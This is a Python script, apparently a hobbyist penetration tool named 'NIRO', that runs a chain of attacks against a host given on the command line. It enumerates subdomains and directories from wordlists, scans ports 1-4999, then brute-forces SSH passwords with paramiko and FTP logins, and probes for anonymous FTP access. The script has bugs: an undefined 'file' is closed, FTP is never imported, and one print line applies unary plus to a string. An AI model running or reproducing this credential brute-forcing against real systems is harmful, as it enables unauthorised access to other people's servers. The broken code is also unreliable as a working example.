import pyfiglet
import socket,requests
from datetime import datetime
import os,sys
import paramiko
from colorama import Fore


intro1 = pyfiglet.figlet_format("--->\\NIRO/<---")
print(Fore.RED + intro1)

intro2 = pyfiglet.figlet_format("Authored by EN-NIARI AMR \nFramed By EL MOSTAPHA CHAKIR" , font="digital")
print(Fore.CYAN + intro2)

now =datetime.now()
dt_string = now.strftime("%d/%m/%Y %H:%M:%S")

print(Fore.WHITE+"************************************************")
print("---------------------------------------------------------------------------------------")
print(Fore.YELLOW + "+ URL      :            http://"+sys.argv[1])
print(Fore.YELLOW + "+ Time     :            "+ dt_string)
print(Fore.YELLOW + "+ Type     :            SUBDOMAIN,search DIRECTORY ,PORT scanning, Passwords SPRYING  ")
print(Fore.WHITE + "---------------------------------------------------------------------------------------")
print("************************************************")
print("\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/")

print(Fore.CYAN+"===========================================================")
print(Fore.WHITE + "[*-*] Starting NIRO in SUBDOMAIN enumeration mode ...")
print(Fore.CYAN+"===========================================================")

s = pyfiglet.figlet_format("SUB-DOMAIN")
print(Fore.MAGENTA+s)

sub_file = str(input(Fore.BLUE+"[+] Enter subdomains file location : "+Fore.WHITE))
sub_list = open(sub_file ,'r')
subdoms = sub_list.readlines()
for sub in subdoms:
   sub_domains = f"http://{sub}.{sys.argv[1]}"
   try :
      requests.get(sub_domains)
   except requests.ConnectionError:
     pass
   else:
     print(Fore.GREEN +"[+] --> Valid domain : ",sub_domains)

sub_list.close()

print(Fore.RED+"---------------END OF SUBDOMAIN ENUMERATION-----------------")

print(Fore.CYAN+"===========================================================")
print(Fore.WHITE+"[*-*] Starting NIRO in DIRECTORY enumeration mode ...")
print(Fore.CYAN+"===========================================================")

d = pyfiglet.figlet_format("Search<->DIRECTORY")
print(Fore.MAGENTA+d)

dir_file = input(Fore.BLUE+"[+] Enter directory name file location : ")

directory = open(str(dir_file),'r')
directory_name = directory.readlines()

for dir in directory_name :
   dir_enum = f"http://{sys.argv[1]}/{dir}"
   r= requests.get(dir_enum)
   if r.status_code == 404:
     pass
   else:
    print(Fore.GREEN+"[+] ---> Valid Directory : ",dir_enum)

file.close()

print(Fore.RED+"---------------END OF DIRECTORY ENUMERATION-----------------")

print(Fore.CYAN+"===========================================================")
print(Fore.WHITE + "[*-*] Starting NIRO in PORT SCANNING mode ...")
print(Fore.CYAN+"===========================================================")

p = pyfiglet.figlet_format("PORT-SCANNING")
print(Fore.MAGENTA+p)

open_ports=[]

ports=range(1,5000)
def probe_port(ip,port,result=1):
   try:
     sock = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
     sock.settimeout(5)
     r= sock.connect_ex((ip,port))
     if r == 0:
        result = r
     sock.close()
   except Exception as e:
     pass
   return result


for port in ports:
     sys.stdout.flush()
     response= probe_port(sys.argv[1],port)
     if response == 0:
         open_ports.append(port)

if open_ports:
    print(Fore.GREEN+"Open Ports are : ")
    print(sorted(open_ports))
else:
    print(Fore.RED+"[-] Looks like no ports are open") 

print(Fore.RED+"---------------END OF PORT SCANNING-----------------")

brute_force = pyfiglet.figlet_format("Password<->SPRYING")
print(Fore.MAGENTA+brute_force)



print(Fore.CYAN+"===========================================================")
print(Fore.WHITE + "[*-*] Starting NIRO in SSH Brute force mode ...")
print(Fore.CYAN+"===========================================================")


username = str(input(Fore.BLUE+"[+] Enter Username : "+Fore.WHITE))
password_file = input(Fore.BLUE+"[+] Enter password file location : "+Fore.WHITE)


def ssh_connect(password, code=0):
    ssh= paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
       ssh.connect( sys.argv[1] ,port=22,username = username, password=password)
    except paramiko.AuthenticationException :
       code = 1
    ssh.close()
    return code

if probe_port(sys.argv[1],22) == 0:  #verification is port 22 open and then continue
        print(Fore.GREEN+" -----------------------")
        print("|   TCP PORT 22 OPEN    |")
        print(" -----------------------")
        ssh_file = open(str(password_file), 'r')
        ssh_line = ssh_file.readlines()   
        for password in ssh_line:

                try :
                    res = ssh_connect(password)
                    print('Trying : '+username+'/'+password)
                    if (res==0) :
                        print(Fore.GREEN+"[OK] Password found: "+ password)
                        print("*_*_*_*_*_*_*_*_*_*_*_*_*_*_*")
                        print("username : "+ username)
                        print("Password : "+ password)
                        print("*_*_*_*_*_*_*_*_*_*_*_*_*_*_*")
                        exit(0)
                    elif res == 1:
                        print(Fore.RED+"[-] No luck")
                except Exception as e :
                        print(e)
                        pass
else:
        print(Fore.RED+"(-_-) PORT 22 CLOSED...")

print(Fore.RED+"---------------END OF SSH BruteForce-----------------")

print(Fore.CYAN+"===========================================================")
print(+Fore.WHITE+"[*-*] Starting NIRO in FTP Brute force mode ...")
print(Fore.CYAN+"===========================================================")


def anonymous(ip):
    try :
        ftp= FTP(ip)
        ftp.login()
        print(Fore.GREEN+"-----------------------------")
        print("[+] Anonymous Login is OPEN")
        print("------------------------------")
        ftp.quit()
    except:
      pass    

def ftp_login(ip,username,password):
    try:
        ftp = FTP(ip)
        ftp.login(username, password)
        ftp.quit()
        print(Fore.GREEN+"[!] Credentials have found.")
        print(Fore.GREEN+"[+] Username : " + username)
        print(Fore.GREEN+"[+] Password : "+ password)
        exit(0)
    except:
        pass


def brute_force(ip, username, wordlist):
    try:
        ftp_list = open(wordlist, 'r')
        words = ftp_list.readlines()
        for word in words:
            word = word.strip()
            print(Fore.MAGENTA+'Trying : '+username+'/'+word)
            ftp_login(ip, username, word)

    except:
        print(Fore.RED+"[-] There is no such wordlist file.")
        exit(0)

#Main program
if probe_port(sys.argv[1],21) == 0:  #verification est ce que le port 21 est ouvert
   print(Fore.GREEN+"----------------------------")
   print(" [+] 21/TCP  FTP ---> OPEN ")
   print("----------------------------")
   username_ftp = input(Fore.BLUE+"Enter a spesific useranme : "+Fore.WHITE)
   wordlists = input(Fore.BLUE+"Enter FTP list file location : "+Fore.WHITE) 
   brute_force(sys.argv[1],str(username_ftp),str(wordlists))
   anonymous(sys.argv[1])
else :
    print(Fore.RED+"----------------------------")
    print("[!] 21/TCP FTP ---> CLOSED")
    print("----------------------------")
print(Fore.RED+"---------------END OF FTP BruteForce-----------------")
